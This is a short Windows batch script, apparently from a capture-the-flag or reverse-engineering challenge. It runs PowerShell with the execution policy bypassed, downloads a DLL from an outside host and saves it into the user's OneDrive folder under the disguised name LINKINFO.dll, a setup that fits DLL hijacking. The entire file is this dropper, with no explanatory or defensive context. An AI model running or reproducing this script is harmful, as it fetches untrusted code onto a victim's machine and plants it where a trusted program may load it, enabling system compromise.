@ECHO off

PowerShell -NoProfile -ExecutionPolicy Bypass -Command ^
   $url = \"http://dr3dd.me/ctf/my_reversl.dll\"; ^
   $usr_path = $env:USERPROFILE; ^
   $output = [System.IO.Path]::Combine($usr_path, \"AppData\Local\Microsoft\OneDrive\LINKINFO.dll\"); ^
   (New-Object System.Net.WebClient).DownloadFile($url, $output)